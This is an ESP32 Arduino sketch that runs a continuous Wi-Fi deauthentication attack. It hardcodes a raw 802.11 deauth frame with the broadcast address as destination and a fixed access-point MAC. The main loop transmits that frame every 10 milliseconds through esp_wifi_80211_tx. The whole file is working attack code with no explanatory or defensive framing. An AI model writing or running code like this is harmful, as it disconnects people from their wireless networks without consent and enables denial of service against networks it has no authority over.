#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

uint8_t deauthPacket[26] = {
    0xC0, 0x00,  
    0x3A, 0x01,  
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  
    0x88, 0xC9, 0xB3, 0x09, 0x5B, 0xD0,  
    0x88, 0xC9, 0xB3, 0x09, 0x5B, 0xD0,  
    0x00, 0x00,  
    0x01, 0x00   
};

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_STA);
    delay(100);
    
    Serial.println("Starting continuous Deauthentication attack...");
}

void loop() {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
    delay(10); 
}